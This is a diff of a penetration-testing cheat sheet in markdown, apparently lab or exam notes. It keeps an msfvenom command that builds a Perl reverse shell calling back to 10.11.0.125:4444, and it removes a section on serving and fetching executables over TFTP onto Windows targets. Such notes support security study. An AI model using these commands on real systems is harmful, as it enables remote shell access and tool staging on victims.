@@ -30,18 +30,3 @@
 **Perl**
 >msfvenom -p cmd/unix/reverse_perl LHOST=10.11.0.125 LPORT=4444 -f raw > shell.pl 
 
-
-## File Transfers
-
-**tftp**
-
-Installed on Windows XP up to 2003 by default
-
->mkdir /tftp
-
->aftpd --daemon --port 69 /tftp
-
->cp /file/you/want /tftp
-
-On Windows 
->tftp -i --yourIP-- get file.exe
